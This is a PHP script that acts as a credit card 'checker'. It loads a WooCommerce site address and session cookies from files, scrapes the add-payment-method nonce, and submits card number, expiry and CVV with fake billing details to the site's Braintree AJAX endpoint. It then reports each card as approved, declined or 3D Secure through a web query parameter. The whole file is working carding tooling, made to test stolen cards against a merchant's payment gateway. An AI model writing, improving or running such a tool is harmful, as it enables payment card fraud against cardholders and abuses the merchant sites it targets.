<?php
function getDomainURL() {
    return trim(file_get_contents("site.txt"));
}

function getCookies() {
    $cookie1 = file_get_contents("cookies_1-1.txt");
    $cookie2 = file_get_contents("cookies_1-2.txt");
    return trim($cookie1) . "; " . trim($cookie2);
}

function extractNonce($site, $cookie) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $site . "/my-account/add-payment-method/");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "Cookie: $cookie",
        "User-Agent: Mozilla/5.0 (Linux; Android 12; Mobile Safari/537.36)"
    ]);
    $html = curl_exec($ch);
    curl_close($ch);

    if (preg_match('/name="security" value="(.*?)"/', $html, $match)) {
        return $match[1];
    }
    return null;
}

function postCard($cc) {
    if (!preg_match('/^\d{12,16}\|\d{2}\|\d{2}\|\d{3,4}$/', $cc)) {
        return ["error" => "Invalid CC format"];
    }

    list($number, $month, $year, $cvv) = explode('|', $cc);
    $site = getDomainURL();
    $cookie = getCookies();
    $nonce = extractNonce($site, $cookie);

    if (!$nonce) return ["error" => "Nonce not found"];

    $payload = http_build_query([
        "action" => "wc_braintree_add_payment_method",
        "security" => $nonce,
        "card_number" => $number,
        "card_expiry_month" => $month,
        "card_expiry_year" => "20" . $year,
        "card_cvc" => $cvv,
        "billing_first_name" => "John",
        "billing_last_name" => "Doe",
        "billing_address_1" => "123 Main St",
        "billing_city" => "LA",
        "billing_postcode" => "90001",
        "billing_country" => "US",
        "billing_state" => "CA",
        "billing_email" => "test@gmail.com",
        "billing_phone" => "1234567890"
    ]);

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $site . "/wp-admin/admin-ajax.php");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "Cookie: $cookie",
        "User-Agent: Mozilla/5.0 (Linux; Android 12; Mobile Safari/537.36)",
        "Content-Type: application/x-www-form-urlencoded"
    ]);

    $response = curl_exec($ch);
    $status = "Unknown ❓";

    if (stripos($response, "invalid") !== false || stripos($response, "declined") !== false) {
        $status = "Declined ❌";
    } elseif (stripos($response, "success") !== false || stripos($response, "added") !== false) {
        $status = "Approved ✅";
    } elseif (stripos($response, "3d secure") !== false) {
        $status = "3D Secure 🔒";
    }

    curl_close($ch);
    return [
        "status" => $status,
        "response_snippet" => substr($response, 0, 300)
    ];
}

// === MAIN CHECKER USAGE ===
if (isset($_GET['cc'])) {
    header('Content-Type: application/json');
    echo json_encode(postCard($_GET['cc']));
} else {
    echo "Usage: ?cc=xxxx|mm|yy|cvv";
}
